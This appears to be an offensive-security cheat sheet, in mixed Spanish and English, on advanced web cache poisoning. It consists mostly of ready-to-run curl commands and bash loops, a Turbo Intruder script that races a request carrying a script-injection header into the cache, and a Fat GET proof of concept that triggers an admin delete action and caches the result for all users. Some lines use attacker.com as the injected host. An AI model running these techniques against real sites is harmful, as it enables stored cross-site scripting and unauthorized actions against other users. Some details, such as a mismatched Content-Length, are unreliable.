---
aliases:
  - WCP Advanced Bypass
  - Cache Race Condition
  - Multi-CDN Cache
  - Fat GET
tags:
  - vuln/cache-poisoning
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Web Cache Poisoning]]"
---
# Web Cache Poisoning - Bypasses Avanzados

***

## Cache Key Normalization Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/page?a=1&b=2&cb=$RANDOM"` y `curl -sI "https://target/page?b=2&a=1&cb=$RANDOM"` | Param order differential cache key | Cache string-based vs sorted. |
| `curl -sI "https://target/page?A=1&cb=$RANDOM"` y `curl -sI "https://target/page?a=1&cb=$RANDOM"` | Param case differential | Backend case-insensitive, cache no. |
| `curl -sI "https://target/page?a=1&a=2&cb=$RANDOM"` | Duplicate param cache key | Backend HPP. |
| `curl -sI "https://target/page?a=&cb=$RANDOM"` | Empty value handling | Cache distinto, backend igual. |
| `curl -sI "https://target/PAGE?cb=$RANDOM"` y `curl -sI "https://target/page?cb=$RANDOM"` | Path case sensitivity | Backend lowercase, cache no. |
| `curl -sI "https://target/page/?cb=$RANDOM"` y `curl -sI "https://target/page?cb=$RANDOM"` | Trailing slash differential | Cache normaliza? |
| `curl -sI -H "Accept-Encoding: gzip" "https://target/?cb=$RANDOM"` y `curl -sI -H "Accept-Encoding: br" "https://target/?cb=$RANDOM"` | Vary `Accept-Encoding` distinct cache slots | Encoding-aware cache. |
| `curl -sI -H "Accept-Language: es" "https://target/?cb=$RANDOM"` y `curl -sI -H "Accept-Language: en" "https://target/?cb=$RANDOM"` | Vary `Accept-Language` cache | i18n-aware cache. |
^wcp-bypass-normalization

### Discover normalization quirks

```bash
URL="https://target/page"

for combo in "?a=1&b=2" "?b=2&a=1" "?A=1&B=2" "?a=1&a=2" "?a=&b=2"; do
  CB="cb=$(date +%s%N)"
  echo "=== $combo ==="
  curl -sI "${URL}${combo}&${CB}" | grep -iE 'x-cache|age:'
done

for s in "/page" "/page/" "/PAGE"; do
  CB="?cb=$(date +%s%N)"
  echo "=== $s ==="
  curl -sI "https://target${s}${CB}" | grep -iE 'x-cache|age:'
done
```

___

## Race Conditions en Cache Fill

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Turbo Intruder script con `concurrentConnections=20`: queue poison_req + N legit_req | Race window cache fill — poison wins | Cache fill window. |
| `for i in {1..100}; do curl -sH "X-Forwarded-Host: attacker.com" "https://target/?cb=$KEY" & done; wait` | Bash parallel race poison | Cache stampede attempt. |
| Burp Repeater group "Send in parallel" con poison + N legit | Single-connection HTTP/2 race | H2 single-packet timing. |
| `curl -X PURGE "https://target/page" && curl -H "X-Forwarded-Host: attacker" "https://target/page"` (race entre PURGE y poison) | Force invalidate + race poison fill | PURGE window. |
| Trigger cache TTL expire + flood concurrent: monitor `Age:` header → flood at expiry | Race fill window post-TTL | Stampede vector. |
| `If-Modified-Since: <past>` + concurrent poison | Conditional GET race | Cache validation race. |
^wcp-bypass-race

### Turbo Intruder cache race

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           pipeline=False)

    poison_req = '''GET /page?cb=12345 HTTP/1.1
Host: target.com
X-Forwarded-Host: <script>alert(1)</script>

'''

    legit_req = '''GET /page?cb=12345 HTTP/1.1
Host: target.com

'''

    engine.queue(poison_req)
    for _ in range(50):
        engine.queue(legit_req)
```

___

## Multi-CDN Chains

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI https://target/ \| grep -iE 'via:\|x-cache\|cf-cache\|x-akamai'` | Identificar CDN tiers (Via header + cache headers) | Pre-attack recon. |
| `curl -sI https://target/PAGE?cb=$RANDOM` y `curl -sI https://target/page?cb=$RANDOM` | Detect tier-specific case normalization | Differential tier-by-tier. |
| `curl -sI -H "Cookie: x=1" "https://target/?cb=$RANDOM"` y `curl -sI "https://target/?cb=$RANDOM"` | Cookie strip per-tier | One CDN strip, otro no. |
| `dig +short target.com` y comparar con `dig +short target.com @1.1.1.1` (different resolver) | Geographic CDN edge selection | Per-region poisoning. |
| `curl --resolve target.com:443:<EDGE_IP> https://target/?cb=$RANDOM` (force specific edge) | Force resolve a edge node específico | Per-edge testing. |
| Poison primer tier (CF) → segundo tier (Akamai) lo sirve → cascada | Cascading multi-tier poison | Si tiers se servir entre sí. |
| `curl -sI -H "X-Forwarded-Host: x" "https://static.target.com/?cb=$RANDOM"` y same en `target.com` | Subdomain CDN switch (CF static, Akamai apex) | Different per-subdomain config. |
^wcp-bypass-multicdn

___

## Fat GET / Fat POST

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X GET -H "Content-Length: 22" --data-binary "user=admin&action=del" "https://target/admin/x?cb=$RANDOM"` | Fat GET — body procesado por backend, cache key = URL only | Backend procesa body. |
| `curl -X POST -H "Cache-Control: public, max-age=3600" -d "action=x" "https://target/?cb=$RANDOM"` | POST con header forzando cache | Backend respeta C-C header. |
| `curl -I "https://target/?cb=$RANDOM"` (HEAD) y `curl "https://target/?cb=$KEY"` (GET subsequent) | HEAD response cached, sirve a GET subsequent | HEAD/GET pollution. |
| `curl -X TRACE "https://target/?cb=$RANDOM"` | TRACE response cached | Edge legacy. |
| `curl -X OPTIONS -H "Origin: attacker.com" "https://target/api/?cb=$RANDOM"` | OPTIONS preflight cached | CORS preflight cache. |
| `curl -X POST -d "_method=GET&action=x" "https://target/?cb=$RANDOM"` | Method override + cache combo | Backend GET, cache POST. |
| `curl -X POST -H "Transfer-Encoding: chunked" --data-binary $'5\r\nhello\r\n0\r\n\r\n' "https://target/?cb=$RANDOM"` | Chunked TE + cache | HRS adjacent. |
^wcp-bypass-fat

### Fat GET PoC

```http
GET /admin/user-data HTTP/1.1
Host: target.com
Content-Length: 27
Cache-Control: public, max-age=3600

action=delete&id=1
```

Cache treats as standard GET (ignores body). Backend procesa body como form-urlencoded → ejecuta delete. Response cached como `/admin/user-data` para todos los users.

***
